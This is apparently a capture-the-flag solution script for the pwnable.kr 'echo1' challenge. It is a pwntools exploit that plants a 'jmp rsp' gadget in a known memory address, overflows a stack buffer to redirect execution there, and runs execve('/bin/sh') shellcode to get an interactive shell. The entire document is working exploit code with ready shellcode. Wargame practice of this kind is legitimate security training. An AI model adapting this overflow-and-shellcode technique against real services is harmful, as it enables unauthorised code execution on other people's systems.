from pwn import *

#s = process('./echo1')
s = remote('pwnable.kr', 9010)

jmp_rsp = "\xff\xe4"
bss_id = 0x6020a0
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = "A"*0x20
payload += "A"*8	#64bit SFP
payload += p64(bss_id)
payload += shellcode

s.sendline(jmp_rsp)	#write jmp_rsp on bss_id
s.sendline('1')		#bof echo

s.sendline(payload)

s.interactive()
